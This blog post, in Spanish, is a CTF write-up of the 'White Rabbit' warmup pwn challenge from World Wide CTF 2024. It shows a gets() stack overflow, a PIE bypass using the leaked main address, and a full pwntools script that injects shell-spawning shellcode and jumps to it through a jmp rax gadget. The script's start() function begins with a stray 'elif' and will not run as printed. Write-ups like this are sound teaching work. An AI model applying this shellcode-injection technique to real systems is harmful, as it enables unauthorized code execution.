---
layout: post
title: White Rabbit World Wide CTF 2024
comments: true
categories: [Pwn, Writeups, WorldWideCTF]
---

Este es el reto de calentamiento de pwn de la World Wide CTF de 2024. Dado a la cantidad de trabajo que tenía no pude darle mucho tiempo a esta competición, pero he de decir que estuvo muy entretenida y tenía un nivelazo!

![Image]({{ site.baseurl }}/images/posts/wwctflogo.png){:width="100px"}

# Overview

En este reto bypasearemos un PIE, introduciremos un *shellcode* en el stack y lo ejecutaremos mediante ROP.

La descripción decía así:

	Just a nice easy warmup for you...

# Reconocimiento

Como nos dan sólo un binario (`64-bits LSB`), comenzamos lanzando *checksec*:

```
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : ENABLED
RELRO     : Partial
```

Vemos que tenemos el **bit NX desactivado**, lo que nos indica que podemos ejecutar código en el stack. Descompilando con *ghidra*:

```c
int main(void)

{
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  puts("\n  (\\_/)");
  puts(&DAT_0010200d);
  printf("  / > %p\n\n",main);
  puts("follow the white rabbit...");
  follow();
  return 0;
}
```

Vemos que nos dan la función de `main`, con lo que podemos saltar el **PIE**. Además la función follow contiene una vulnerabilidad de tipo *Buffer overflow*:

```c
void follow(void) {
  char buf [100];
  
  gets(buf);  //GETS es siempre vulnerable
  return;
}
```

# Explotación

Con esta información, podemos tratar de introducir un *shellcode* en el stack y ejecutarlo con un *gadget* `jmp eax`. Podemos calcular el offset hasta el *RIP* con cyclic y la dirección del gadget con *ropper*:

```bash
gdb-peda$ !pwn cyclic -l faabgaab

120
```

```bash
ropper -f white_rabbit | grep "jmp"

0x00000000000010bf: jmp rax; 
```

Como el *PIE* está activado, debemos calcular la dirección del gadget relativa a `main`, para ello, tomamos la dirección que obtenemos de *gdb* y le restamos la que nos da ropper:

```
0x0000000000001180 - 0x00000000000010bf = 0x00c1
```

A la hora de utilizar el gadget, utilizaremos la dirección de *main* que nos dan menos `0x00c1`:

```python
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    elif args.REMOTE:
        return remote("url", 1337)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Set up pwntools for the correct architecture
exe = './white_rabbit'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'


# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

io.recvuntil(b'> ')

main = io.recvuntil(b'\n') #Get the address of main from leak

JMP_RAX = int(main, 16) - 0xc1 #Calculate the address of the jmp rax gadget

payload = asm(shellcraft.sh())        # front of buffer <- RAX points here
payload = payload.ljust(120, b'A')    # pad until RIP
payload += p64(JMP_RAX)               # jump to the buffer - return value of gets()

io.sendline(payload)
io.interactive()
```

Podemos hacer que *pwntools* tome directamente la dirección del propio gadget de la memoria (aunque es interesante saber cómo obtenerla manualmente):

```python
JMP_RAX = jmp_rax = next(elf.search(asm('jmp rax')))
```

Y tras ejecutar deberíamos obtener una shell. Vaya reto para empezar en caliente!!!